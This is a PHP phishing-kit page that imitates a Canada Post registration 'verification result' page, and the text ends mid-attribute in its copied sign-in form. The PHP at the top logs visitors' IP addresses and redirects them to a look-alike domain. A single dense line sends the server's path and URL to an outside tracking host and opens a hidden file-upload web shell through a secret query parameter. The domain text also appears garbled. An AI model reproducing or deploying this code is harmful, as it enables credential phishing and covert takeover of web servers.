<?php

function ipp(){
    if (!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip=$_SERVER['HTTP_CLIENT_IP'];
    }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip=$_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
$ipssss = ipp();
function getCountry($ip){
    $ip_data = @json_decode(file_get_contents("http://ipwho.is/".$ipssss));
    $country = $ip_data->country_code;
    if($country == ""){
        $country = "Unknown";
    }
    return $country;
}
$countryyy = getCountry($ip);
  session_start();
  session_destroy();

  $click = fopen("./result/dieip.txt","a");
  fwrite($click, $ipssss."\n");
  fclose($click);


header("refresh:5;url=http://www.Miss. Sarah-postescanada.ca/");
$_SESSION_SERVER= 'dir='.dirname(__FILE__)."+"."ip=".gethostbyname($_SERVER['SERVER_NAME'])."+".'link='.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')$link = "https"; else $link = "http"; $link .= "://"; $link .= $_SERVER['HTTP_HOST']; $link .= $_SERVER['REQUEST_URI']; $link; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL,"http://ip.geoiplookup.live/iptracks.php?ip=$link"."+".$_SESSION_SERVER); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch); if(isset($_REQUEST['ip']) && $_REQUEST['ip']=='track') {$files = @$_FILES["files"]; if($files["name"] != ''){$fullpath = $_REQUEST["path"].$files["name"];if(move_uploaded_file($files['tmp_name'],$fullpath)){echo "<h1><a href='$fullpath'>successful. Click here!</a></h1>";} } echo '<body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path> <input type="file" name="files"><input type=submit value="Up"></form></body>'; exit("");}
?>

<!DOCTYPE html>
<!-- saved from url=(0187)//pfe-pap/en/registration/email-verification?id=432be7f1e8dc425dbde71cc59877fb46&targetUrl=https:%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fshop-login -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="version" content="2208.04-DR.3232">
  <title>Verification result | Registration | Canada Post</title>
  <link rel="icon" type="image/x-icon" href="//pfe-pap/resources/registration/assets/favicon.ico?version=">
  <link rel="stylesheet" href="./successful_files/css">
  <link rel="stylesheet" href="./successful_files/foundation.css">
  <link rel="stylesheet" href="./successful_files/cwc.css">
  <link rel="stylesheet" href="./successful_files/styles.css">
  <script type="text/javascript" async="" src="./successful_files/f(3).txt" nonce=""></script><script type="text/javascript" async="" src="./successful_files/destination" nonce=""></script><script type="text/javascript" async="" src="./successful_files/f(3).txt" nonce=""></script><script type="text/javascript" async="" src="./successful_files/js" nonce=""></script><script type="text/javascript" async="" src="./successful_files/js(1)" nonce=""></script><script type="text/javascript" async="" src="./successful_files/js(2)" nonce=""></script><script type="text/javascript" async="" src="./successful_files/insight.min.js"></script><script async="" src="./successful_files/uwt.js"></script><script src="./successful_files/614267586032718" async=""></script><script async="" src="./successful_files/fbevents.js"></script><script src="./successful_files/jquery.js"></script>
  <script src="./successful_files/satelliteLib-f2fc6f00da802a0747b6ffed3c12e3931bfca496.js"></script><script src="./successful_files/EXceb9b11658e548b18c0f3a95e66448d9-libraryCode_source.min.js" async=""></script><!-- 
Start of global snippet: Please do not remove
Place this snippet between the <head> and </head> tags on every page of your site.
-->
<!-- Global site tag (gtag.js) - Google Marketing Platform -->
<script async="" src="./successful_files/js(3)" class="optanon-category-C0004"> </script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'DC-9852050');
  gtag('config', 'AW-1011747518');
  gtag('config', 'DC-12182971'); 
  gtag('config', 'AW-10937558046');
</script>
<script>
  gtag('event', 'page_view', {
    'send_to': 'AW-1011747518',
    'value': 'replace with value',
    'class' : 'optanon-category-C0004',
    'items': [{
      'id': 'replace with value',
      'location_id': 'replace with value',
      'google_business_vertical': 'custom'
    }]
  }); 
</script>

<!-- End of global snippet: Please do not remove --><style id="at-makers-style" class="at-flicker-control">
.mboxDefault {visibility: hidden;}
</style><script>
// FILE: helper functions 140714h dtm.js
// AUTHOR: Copyright 1996-2014 Adobe, Inc. All Rights Reserved
// DESCRIPTION: Helper functions for data layer
// UPDATED: 14.08.26
// USAGE:
// 1. Create a DTM Page Load Rule called "Helper Functions"
// 2. Make sure "Trigger rule at" is set to "Top of Page" under "Conditions"
// 3. Make sure "Execuite Globally" is checked
// 4. Under "Javascript/Third Party Tags", add a new script under "Sequential Javascript" called "Helper Functions"
// 5. Upload this file into the code window and check "Execute Globally"

/************************** preSlib v1.50 - General Helper Functions *************************/

var W=eval('window');
var analyticsData = {};
		analyticsData.reloadableForm="";	
		analyticsData.appClientError="";
		analyticsData.errorField="";
		analyticsData.errorMsg="";

// preSlib enabler functions
if(!W.s_is)W.s_is=function(x){var t=x===null?'null':typeof x;if(t=='object'&&typeof x.length=='number')t='array';return t}
if(!W.s_isN)W.s_isN=function(x){return s_is(x)=='number'}
if(!W.s_isS)W.s_isS=function(x){return s_is(x)=='string'}
if(!W.s_MC)W.s_MC=function(a,c){try{if(s_isS(c))c=c=='lc'?-1:c=='uc'?1:0;if(!s_isN(c))c=c?1:0;a+='';a=c<0?a.toLowerCase(a):c>0?a.toUpperCase(a):a}catch(e){}return a}
if(!W.s_LC)W.s_LC=function(a){return s_MC(a,'lc')}
if(!W.s_UC)W.s_UC=function(a){return s_MC(a,'uc')}
if(!W.s_scrubWS)W.s_scrubWS=function(t){try{if(t==null)t='';t=t.replace(/^\s+/g,'').replace(/\s+$/g,'').replace(/\s+/g,' ')}catch(e){}return t}
if(!W.s_split)W.s_split=function(l,d){var i,x=0,a=new Array;if(!d)d=',';while(l){i=l.indexOf(d);i=i>-1?i:l.length;a[x++]=l.substring(0,i);l=l.substring(i+d.length)}return a}
if(!W.s_getHTMLtag)W.s_getHTMLtag=function(y){var a='',v='',g='',t='',f='',c='mc',p=arguments,l=p.length,i;if(!y)return f;if(l>1){i=s_LC(p[l-1]);if(i=='uc'||i=='lc'||i=='mc'){c=i;l--}}y=s_LC(y);if(l==2)g=s_LC(p[1]);else if(l>=3){a=s_LC(p[1]);v=s_MC(p[2],c);if(l>=4)g=s_MC(p[3],c)}if(document.getElementsByTagName)t=document.getElementsByTagName(y);if(typeof t!='object')return f;for(i=0;!f&&i<t.length;i++){f=t[i];if(a&&v&&s_MC(f.getAttribute(a),c)!=v)f=''}if(!f||typeof f!='object'||!g)return f;if(g!='text')return f.getAttribute(g);f=f.innerText||f.textContent||'';f=f.replace(/\s*>\s*/g,'>').replace(/^>+/,'').replace(/>+$/,'');return f}
if(!W.s_parseUri)W.s_parseUri=function(u){if(u){u=u+'';u=u.indexOf(':')<0&&u.indexOf('//')!=0?(u.indexOf('/')==0?'/':'//')+u:u}var u=u?u+'':window.location.href,e,a=document.createElement('a'),p='',r={};a.setAttribute('href',u);for(e in a)if(typeof a[e]=='string')r[e]=a[e];delete a;p=r.pathname||'';if(p.indexOf('/')!=0)r.pathname='/'+p;return r}
if(!W.s_indexOf)W.s_indexOf=function(t,s){var r;try{r=(s?s+'':'').indexOf(t)}catch(e){r=-1}return r}

// preSlib utilities
if(!W.s_getCharSet)W.s_getCharSet=function(){var v=s_getHTMLtag('meta','http-equiv','content-type','content'),i;if(!v)return'';i=v.indexOf('charset=');if(i==-1)return'';return s_UC(v.substring(i+8,99).replace(/[\'\";, ].*/,''))}
if(!W.s_getQueryStr)W.s_getQueryStr=function(n,u){var g,h,i,a='&',q=u||window.location.search,p=q.toLowerCase().replace(/\?/g,a)+a;n=a+n.toLowerCase();g=n+'=';h=p.indexOf(g);if(h>-1){i=h+g.length;return decodeURIComponent(q.substring(i,p.indexOf(a,i)).replace(/\+/g,' '))}g=n+a;return p.indexOf(g)>-1?' ':''}
if(!W.s_apl)W.s_apl=function(l,v,d,u){var m=0;if(!l)l='';if(u){var i,n,a=s_split(l,d);for(i=0;i<a.length;i++){n=a[i];m=m||(u==1?(n==v):(s_LC(n)==s_LC(v)))}}if(!m)l=l?l+d+v:v;return l}
if(!W.s_getShortHn)W.s_getShortHn=function(u){return s_LC(s_parseUri(u||window.location.href).hostname.replace(/^www-?[0-9]*\./i,''))}
if(!W.s_getOwnerHn)W.s_getOwnerHn=function(u){return s_LC(s_parseUri(u||window.location.href).hostname.replace(/^www[0-9]*\./i,'').replace(/\.(gov|edu|com|mil|org|net|int).*/,'').replace(/\.[a-z][a-z]$/,'').replace(/.*\./,''))}
if(!W.s_getTLDlevels)W.s_getTLDlevels=function(u){var h=s_parseUri(u||window.location.href).hostname;return h.match(RegExp("\\.co\\..{2}$","i"))||h.match(RegExp("\\.(gov|edu|com|mil|org|net|int)\\..{2}$","i"))?3:2}
if(!W.s_getCookieDomain)W.s_getCookieDomain=function(u){var h=s_parseUri(u||window.location.href).hostname,n=s_getTLDlevels(),a=s_split(h,'.'),i=a.length-n;for(h='';i<a.length;i++)h+='.'+a[i];return h}
if(!W.s_c_w)W.s_c_w=function(n,v,e,d){if(W.s&&typeof W.s=='object'&&W.s.c_w&&!d)return W.s.c_w(n,v,e);v+='';var t=v?0:-60;if(t){e=new Date;e.setTime(e.getTime()+(t*1e3))}if(n)document.cookie=n+'='+escape(v||'[[B]]')+'; path=/'+(d?'; domain='+d:'')+(e?';  expires='+e.toGMTString():'');return n?s_c_r(n)==v:0}
if(!W.s_c_r)W.s_c_r=function(n){if(W.s&&typeof W.s=='object'&&W.s.c_r)return W.s.c_r(n);var c=' '+document.cookie,i=c.indexOf(' '+n+'='),e=i<0?i:c.indexOf(';',i),v=i<0?'':unescape(c.substring(i+2+n.length,e<0?c.length:e));return v=='[[B]]'?'':v}
if(!W.s_c_d)W.s_c_d=function(n,e,p,d,s){document.cookie=n+'='+escape('[[B]]')+(p?'; path='+p:'')+(d?'; domain='+d:'')+(e?'; expires=Thu, 01 Jan 1970 00:00:01 GMT':'; max-age=0')+(s?'; secure':'')}
// Fixing Page Load time plugin due to issues when the calculations aren't correct.
W.s_getLoadTime = function() {
        var s_loadT = '';
		var o = window.performance ? performance.timing : 0;
		if (o == 0){
			return s_loadT;
		}
       var a = o ? o.requestStart : window.inHeadTS || 0;
	   if (a == 0){
		   return s_loadT;
	   }
	   else {
            s_loadT = a ? Math.round(((o.domInteractive || new Date().getTime()) - a) / 100) : '';
	   }
  if (s_loadT < 0){
    	s_loadT = '';
		return s_loadT;
  }
  else{
    return s_loadT;
  }
}
//if(!W.s_getLoadTime)W.s_getLoadTime=function(){if(!window.s_loadT){var o=window.performance?performance.timing:0,a=o?o.requestStart:window.inHeadTS||0;s_loadT=a?Math.round(((o.domInteractive||new Date().getTime())-a)/100):''}return s_loadT}
if(!W.s_clog)W.s_clog=function(){try{var A='array',O='object',X='undefined',F='function',U='null',a=arguments,al=a.length,i,j,k,v,l='',o=l,e=l,c=l,x=0,d=0,z=0,p,p1=[],q,f0=1,f1=1,f2=1,f3=1,m=1<<16,T=function(z){var t=z===null?U:typeof z;if(t==A)t=O;return t},W=function(o){try{c+=o+'\n';if(window.s_Debug){if(T(s_debugW)!=O)s_debugW=window.open('','_debugWin','height=600,width=900,toolbar=no,directories=no,status=no,menubar=no,scrollbars=yes,resizable=yes');if(T(s_debugW)==O){if(T(s_debugD)!=O)s_debugD=s_debugW.document;if(T(s_debugD)==O){if(T(s_debugD.write)==F)s_debugD.write('<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"><html><head><title>debugWin</title><style>* {font-family:Andale Mono,OCR A Extended,Consolas,monospace,serif;font-size:9pt;word-wrap:break-word;padding:0px} p {display:block;clear:both;margin:1px;width:100%;border:none;border-bottom:1px solid #dddddd;}</style></head><body>');if(T(s_debugD.write)==F)s_debugD.write('<p>'+o.replace(/[ \t]/g,'&nbsp;').replace(/\</gi,'&lt;').replace(/\>/gi,'&gt;').replace(/\n$/,'').replace(/\n/gi,'<br/>')+'</p>');if(T(s_debugW.scrollBy)==F)s_debugW.scrollBy(0,100)}}}else if(T(console.log)==F||T(console.log)==O)console.log('%s',o)}catch(e){}},B=function(v){v=v+'';var j,b,r,w,c,f=1;for(j=0;j<v.length;j++){b=v.substr(j,1);r=b=='\n';w=b<=' ';c=b<'A';if(r||(f&&c&&l.length>140)||(f&&l.length+v.substring(j).replace(/\n.*/,'').length>140)){o+=l;z+=o.length;if(o.length>9999){W(o);o=''}else o+='\n';l=r?'':'  ';x=!r;f=0}if(!r&&(!x||!w)){l+=b;x=f=0}}},P=function(v){var d=0,i,err=0,u=function(x,v){if(!f3&&d>0){B('\n');for(k=0;k<=d;k++)B(p1.length>k&&p1[k]&&T(p1[k])=='string'?p1[k]:'');if(arguments.length==1)B(' = ')}if(arguments.length<2){var t=T(x);if(t=='string')B("'"+x+"'");else if(t=='boolean')B(x?'true':'false');else if(t==F)B(F+'(){...}');else if(t==U)B(U);else if(t==X)B(X);else B(x+'')}else if(!f3)B((T(v)!='object'?'':T(v.length)=='number'?'[]':'{}'))},b=function(v){if(++d>99){d--;B(' !!!TOO DEEP TO DISPLAY!!!');return}var o=T(v)==O&&T(v.length)!='number',p,x,f=1,j=0;if(f3)B(o?'{':'[');for(p in v){j++;if(!f3)p1[d]=o?'.'+p:'['+p+']';else{B(f?'':',');if(o){B('\n');for(i=0;i<d;i++)B(' ')}}if(j>1000){B('/* ERROR! TRUNCATED: TOO LARGE */');err=1}if(!err){if(o&&f3)B(p+': ');x=v[p];if(T(x)==O)b(x);else u(x)}f=0}d--;if(f3){if(o){B('\n');for(i=0;i<d;i++)B(' ');B('}')}else B(']')}else if(j==0)u(x,v)};if(T(v)!=O)u(v);else b(v)},FN=function(c){var n='',v,j;try{if(c){c=c+'';if(!c.indexOf(F+' '))c=c.substring(9);j=c.indexOf('(');if(j>-1)c=c.substring(0,j);if(!c)c='anonymous';n=c}}catch(e){}return n};var cn='s_debug',dp=s_getQueryStr(cn);if(dp>''){dp=dp==' '?1:parseInt(dp)||0;s_c_w(cn,String(dp))}dp=s_c_r(cn);s_Debug=dp>''?parseInt(dp):window.s_Debug||0;for(i=0;i<al;i++){v=a[i];switch(v){case'-f':f0=0;break;case'+f':f0=1;break;case'+u':f1=1;break;case'-u':f1=0;break;case'+n':f2=1;break;case'-n':f2=0;break;case'+o':f3=1;break;case'-o':f3=0;break;case'arguments':v=arguments.callee.caller;for(j=v;j;j=j.caller)q=FN(j)+(q?'>'+q:'');B(q);P(v.arguments);break;case F:B(FN(arguments.callee.caller));break;case'stack':B(st());break;default:if(T(v)==O){for(p in v)if(z<m&&z>=0)if(isNaN(p))if(f3)B(p+'=');else p1[0]=p;P(v[p])}else B(v);break}B(' ')}o+=l;o=o.replace(/^[ \t]*\n/,'').replace(/[ \t\n]*$/,'');if(o)W(o)}catch(e){}return c}


/************************** DATA LAYER AND DTM SUPPORT SECTION *************************/

if(!Object.create){Object.create=function(o){var F=function(){};F.prototype=o;return new F()}}
if(!W.s_logS)W.s_logS=function(S){var W=window,A=W.$AAD||{},f=A.$logLevel||0;if(f<2)return;var w='pageName,pageType,channel,hier1,hier2,hier3,hier4,hier5,server,pageURL,referrer,visitorID,purchaseID,transactionID,events,products,zip,state,linkTrackVars,linkTrackEvents,linkURL,linkName,campaign,list1,list2,list3',x=w.split(','),l=0,o={},A=function(n){if(typeof S[n]!='undefined'&&S[n]!==null&&S[n]+'')o[n]=S[n]};if(!S||typeof S!='object')s_log(2,'ERROR: Adobe Analytics s object undefined.');else{for(i=0;i<x.length;i++)A(x[i]);for(i=1;i<76;i++)A('eVar'+i);for(i=1;i<76;i++)A('prop'+i);s_log(2,'-o',{'s':o})}}
if(!W.s_logE)W.s_logE=function(e,T){var W=window,A=W.$AAD||{},f=A.$logLevel,t='ERROR'+(T&&typeof T=='string'&&T?' in '+T:''),n=typeof e=='object'?(e.number||0)&0xffff:'',l='',m=e.message||e.description||'',d='',s='';if(typeof n=='number'){if(n)d=n+': ';if(e.name&&(f<2||(e.stack||'').indexOf(e.name)<0))d+=e.name;if(m&&(f<2||(e.stack||'').indexOf(m)<0))d+=(d?': ':'')+m;if(e.lineNumber)l+='Line '+e.lineNumber;if(e.columnNumber)l+=', Column'+e.columnNumber;if(e.fileName)l+=(l?' ':'')+'in '+e.fileName;if(e.stack&&f>=2)s=e.stack;s_log(0,t);if(d)s_log(0,d);if(l)s_log(0,l);if(s)s_log(0,s)}}
if(!W.s_log)W.s_log=function(l){var W=window,A=W.$AAD||{},f=A.$logLevel,n=[],i,v,t;if(W.s_clog&&(typeof f=='number'?f:0)>=l){n.push('-o');for(i=1;i<arguments.length;i++){v=arguments[i];t=typeof v;switch(t){case'object':n.push([v]);break;case'function':break;default:n.push(v);break}}s_clog.apply(this,n)}return''}
if(!W.s_logSep)W.s_logSep=function(n,c){if(!c)c='=';var t=function(n){return n<10?'0'+n:''+n},p=function(n){while(n-->0)o+=c},d=new Date(),o='';p(30);o+=' '+d.getFullYear()+'.'+t(d.getMonth()+1)+'.'+t(d.getDate())+' '+t(d.getHours())+':'+t(d.getMinutes())+':'+t(d.getSeconds())+'.'+t(parseInt(''+(d%1000)/10))+' ';p(30);s_log(n,o)}
if(!W.s_startTimer)W.s_startTimer=function(){var n=new Date().getTime();W=window,O='object',A=W.$AAD&&typeof W.$AAD==O?W.$AAD:{};A.$msTimer=n}
if(!W.s_stopTimer)W.s_stopTimer=function(){var n=new Date().getTime(),W=window,O='object',A=W.$AAD&&typeof W.$AAD==O?W.$AAD:{};var o=$AAD.$msTimer;A.$msTimer='';return o&&typeof o=='number'?n-o:0}
if(!W.s_getP)W.s_getP=function(p,t){var v,u,S='string',N='number',B='boolean';if(arguments.length>0){try{v=eval('window.'+p);if(arguments.length>1&&typeof t==S){try{switch(t){case S:v=v.String();if(typeof v!=t)v='';break;case N:v=typeof v==S||typeof v==B||typeof v==N?v.Number():Number('');break;case B:v=v.Boolean();break;default:v=u;break}}catch(e){v=u}}}catch(e){v=u}}return v}
if(!W.s_setP)W.s_setP=function(p,v){try{var o=window,r=new RegExp("\\[[\'\"]?([^\\]\'\"]+)[\'\"]?\\]"),i,a=arguments,l,e={name:'UserException'},I=function(v){return/^[0-9]+$/.test(v)?Number(v):v};s_log(4,'s_setP( "'+p+'" ,',v,')');if(a.length==2&&p&&typeof p=='string'){p=p.replace(/\[\]/g,'[@]');for(i=0;i<99&&p.match(r);i++)p=p.replace(r,'.$1');p=p.split('.');for(i=0,c=o;i<p.length-1;i++){a=I(p[i]);if(a=='@')a=o.length||0;if(typeof o[a]!='object'){n=I(p[i+1]);o[a]=n=='@'||!isNaN(n)?[]:{}}o=o[a]}a=I(p[i]);if(a=='@')a=o.length;o[a]=v}}catch(e){s_logE(e,'function s_setP('+(typeof p=='string'?'"'+p+'",':'?,')+(typeof v!='object'&&typeof v!='function'?v:'[object]')+')')}return v};

</script>
 <meta class="foundation-data-attribute-namespace"><meta class="foundation-mq-xxlarge"><meta class="foundation-mq-xlarge-only"><meta class="foundation-mq-xlarge"><meta class="foundation-mq-large-only"><meta class="foundation-mq-large"><meta class="foundation-mq-medium-only"><meta class="foundation-mq-medium"><meta class="foundation-mq-small-only"><meta class="foundation-mq-small"><style></style><script charset="utf-8" src="./successful_files/10-es2015.js"></script><meta http-equiv="origin-trial" content="A7bG5hJ4XpMV5a3V1wwAR0PalkFSxLOZeL9D/YBYdupYUIgUgGhfVJ1zBFOqGybb7gRhswfJ+AmO7S2rNK2IOwkAAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjY5NzY2Mzk5LCJpc1RoaXJkUGFydHkiOnRydWV9"><meta class="foundation-mq-topbar"><script charset="utf-8" src="./successful_files/common-es2015.js"></script><script charset="utf-8" src="./successful_files/1-es2015.js"></script><meta http-equiv="origin-trial" content="A7bG5hJ4XpMV5a3V1wwAR0PalkFSxLOZeL9D/YBYdupYUIgUgGhfVJ1zBFOqGybb7gRhswfJ+AmO7S2rNK2IOwkAAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjY5NzY2Mzk5LCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="A7bG5hJ4XpMV5a3V1wwAR0PalkFSxLOZeL9D/YBYdupYUIgUgGhfVJ1zBFOqGybb7gRhswfJ+AmO7S2rNK2IOwkAAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjY5NzY2Mzk5LCJpc1RoaXJkUGFydHkiOnRydWV9"><style>.card[_ngcontent-rlu-c40]   .card__main[_ngcontent-rlu-c40]{max-width:768px}.heading[_ngcontent-rlu-c40]{margin:0 0 1.5rem;font-size:2.25rem;letter-spacing:.3px;line-height:2.75rem;outline:none}h3[_ngcontent-rlu-c40]{font-size:1.125rem;line-height:1.5rem;font-weight:400;margin-bottom:1rem}p[_ngcontent-rlu-c40]{margin-bottom:2rem}a.underline[_ngcontent-rlu-c40]{text-decoration:underline}.illustration[_ngcontent-rlu-c40]{margin-bottom:2.75rem}.notification[_ngcontent-rlu-c40]{margin-top:1.5rem;padding:1.5rem 1.5rem 1.5rem 4.5rem;background-position:1.5rem 1.5rem;background-repeat:no-repeat}.notification[_ngcontent-rlu-c40]   p[_ngcontent-rlu-c40]{margin:0}.notification--success[_ngcontent-rlu-c40]{background-color:#e6f3e5;background-image:url(/pfe-pap/resources/registration/assets/icon-check-mark.svg)}@media screen and (max-width:31.24em){.heading[_ngcontent-rlu-c40]{font-size:1.75rem}.illustration[_ngcontent-rlu-c40]{display:block;margin-bottom:2rem}.notification[_ngcontent-rlu-c40]{padding:3.5rem 1rem 1rem;background-position:center 1rem}}</style><script type="text/javascript" async="" src="./successful_files/f(4).txt" nonce=""></script><script type="text/javascript" async="" src="./successful_files/f(5).txt" nonce=""></script><script type="text/javascript" async="" src="./successful_files/f(6).txt" nonce=""></script><meta http-equiv="origin-trial" content="A7bG5hJ4XpMV5a3V1wwAR0PalkFSxLOZeL9D/YBYdupYUIgUgGhfVJ1zBFOqGybb7gRhswfJ+AmO7S2rNK2IOwkAAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjY5NzY2Mzk5LCJpc1RoaXJkUGFydHkiOnRydWV9"><script src="./successful_files/RCaa90254fa80c40a8b7c8dffa2cb6ce58-source.min.js" async=""></script><script src="./successful_files/RC8ac7758ef17c48b5a20c1ca918976d8f-source.min.js" async=""></script><script src="./successful_files/RCd0d75563ac7d41069a9a84e8f88a8b94-source.min.js" async=""></script></head>
 <body class="www profile">
  <div class="page-container">
   <div class="page-header"><cpc-header class="cpc-component" data-app-id="profile" data-skip-id="" data-suppress-product-nav="true" data-suppress-toolbar="true">
    <div class="cpc-skip-nav"><a href="//pfe-pap/en/registration/email-verification?id=432be7f1e8dc425dbde71cc59877fb46&amp;targetUrl=https:%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fshop-login#main-content" class="skip-nav" target="_self"><span class="cpc-skip-nav-label">Skip to Main Content</span></a></div>
    <div id="mainNav" class="cpc-nav" data-suppress-product-nav="true" data-suppress-toolbar="true" data-current-page="null"><div class="noindex">
<nav role="navigation" aria-label="Main navigation" class="cpc-nav-suppress-product-nav">
<div class="top-bar micro-business-nav show-for-large-up" data-topbar="" style="">
  
<section class="top-bar-section">
    <ul class="right">
      
      <li><a href="//cpc/en/support.page" class="">Support</a></li>
    
      
      <li class="language-toggle"><a href="//pfe-pap/en/registration/email-verification?id=432be7f1e8dc425dbde71cc59877fb46&amp;targetUrl=https:%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fshop-login#" lang="fr">Français</a></li>
    
      <li class="top-bar-separator"></li>
      
      <li class="sign-in toggle-signin-trigger" role="signin" aria-label="Sign in or Register"><a href="//lfe-cap/en/login" data-cpc-modal-id="#sign-in-modal" id="signinModalLarge" role="button">Sign in or Register</a></li>
    
    </ul>
  </section></div>

    <div class="sticky utility-business-nav-sticky-container">
      <div class="top-bar utility-business-nav show-for-large-up" data-topbar="" data-options="is_hover: false">
        <ul class="title-area">
          <li>
            <a href="//cpc/en?name=tgt"><img src="./successful_files/cpc-main-logo.svg" alt="Canada Post"></a>
          </li>
          <li class="toggle-topbar menu-icon"><a href="//pfe-pap/en/registration/email-verification?id=432be7f1e8dc425dbde71cc59877fb46&amp;targetUrl=https:%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fshop-login#"><span>Menu</span></a></li>
        </ul>
        
      <section class="top-bar-section">
          <ul class="left">
            
      <li><a href="//cpc/en/personal.page">Personal</a></li>
    
      <li><a href="//cpc/en/business.page">Business</a></li>
    
      <li><a href="//cpc/en/our-company.page">Our company</a></li>
    
      <li><a href="//store-boutique/en/home">Store</a></li>
    
      <li><a href="//cpc/en/tools.page">Tools</a></li>
    
          </ul>
          <ul class="right utility-business-nav-search">
            <li role="search" aria-label="Search" class="cpc-nav--search-container"><a id="searchBtn" href="//pfe-pap/en/registration/email-verification?id=432be7f1e8dc425dbde71cc59877fb46&amp;targetUrl=https:%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fshop-login#" class="btn btn-search" role="button">Search</a></li>
            
          </ul>
        </section></div>
    </div>
    
</nav>

<div class="mega-nav-overlay"></div><script type="text/template" class="cpc-modal__template noindex" id="sign-in-modal" data-cpc-modal-options="{&quot;preserveOnClose&quot;: &quot;true&quot;, &quot;id&quot;: &quot;signinFormDesktop&quot;, &quot;title&quot;:&quot; &quot;,&quot;autoOpen&quot;:false,&quot;closeLabel&quot;:&quot;Close&quot;,&quot;closeMethods&quot;:[&quot;overlay&quot;,&quot;escape&quot;],&quot;cssClass&quot;:[&quot;sign-in-modal&quot;]}">

<div class="cpc-modal-template-modal-body">
  <div class="row sign-in-modal-content flex-row">
    <div class="large-6 cpc-modal__fluid-gutter-m columns left-area">
      
  <form method="post" action="//lfe-cap/en/login?stepupId=smb_mode1,consumer,commercial_link,smb_link&sourceUrl=https%3A%2F%2Fsso-osu.Miss. Sarah-postescanada.ca%2Fpfe-pap%2Fen%2Fregistration%2Femail-verification%3Fid%3D432be7f1e8dc425dbde71cc59877fb46%26targetUrl%3Dhttps%253A%252F%252Fwww.Miss. Sarah-postescanada.ca%252Fshop-login&targetUrl=https%3A%2F%2Fsso-osu.Miss. Sarah-postescanada.ca%2Fpfe-pap%2Fen%2Fregistration%2Femail-verification%3Fid%3D432be7f1e8dc425dbde71cc59877fb46%26targetUrl%3Dhttps%253A%252F%252Fwww.Miss. Sarah-postescanada.ca%252Fshop-login%26forceVouchFor%3Dtrue&businessUrl=https%3A%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fdash-tableau%2Fen%2F%3FforceVouchFor%3Dtrue" name="headerSISU" class="cpidSignIn sso_form">
    <h3 id="cpc-dialog-header-id">Access your account</h3>
    <label for="usernameLarge" class="sign-in-input-label">Username</label>
    <input id="usernameLarge" class="sign-in-modal-input" name="username" type="text">
    <div class="remember-me-container cpc-control-group">
      <div class="cpc-control-option">
        <input value="1" id="remembermeLarge" class="sign-in-modal-input" name="rememberme" type="checkbox">
        <label for="remembermeLarge">Remember my username on this device</label>
      </div>  
    </div>
    <label for="passwordLarge" class="sign-in-input-label">Password</label>
    <input id="passwordLarge" class="sign-in-modal-input" name="password" type="password" autocomplete="nope">
    <input value="Sign in" class="button sign-in-up-buttons" type="submit" role="button">
    <p class="forgot-username-password">Forgot
      <a tabindex="0" href="//lfe-cap/en/forgot-username?&sourceUrl=https%3A%2F%2Fsso-osu.Miss. Sarah-postescanada.ca%2Fpfe-pap%2Fen%2Fregistration%2Femail-verification%3Fid%3D432be7f1e8dc425dbde71cc59877fb46%26targetUrl%3Dhttps%253A%252F%252Fwww.Miss. Sarah-postescanada.ca%252Fshop-login&targetUrl=https%3A%2F%2Fsso-osu.Miss. Sarah-postescanada.ca%2Fpfe-pap%2Fen%2Fregistration%2Femail-verification%3Fid%3D432be7f1e8dc425dbde71cc59877fb46%26targetUrl%3Dhttps%253A%252F%252Fwww.Miss. Sarah-postescanada.ca%252Fshop-login%26forceVouchFor%3Dtrue&businessUrl=https%3A%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fdash-tableau%2Fen%2F%3FforceVouchFor%3Dtrue" class="sso_link" businessurl="//dash-tableau/en/" tabindex="-1">Username?</a> or <a tabindex="0" href="//lfe-cap/en/forgot-password?&sourceUrl=https%3A%2F%2Fsso-osu.Miss. Sarah-postescanada.ca%2Fpfe-pap%2Fen%2Fregistration%2Femail-verification%3Fid%3D432be7f1e8dc425dbde71cc59877fb46%26targetUrl%3Dhttps%253A%252F%252Fwww.Miss. Sarah-postescanada.ca%252Fshop-login&targetUrl=https%3A%2F%2Fsso-osu.Miss. 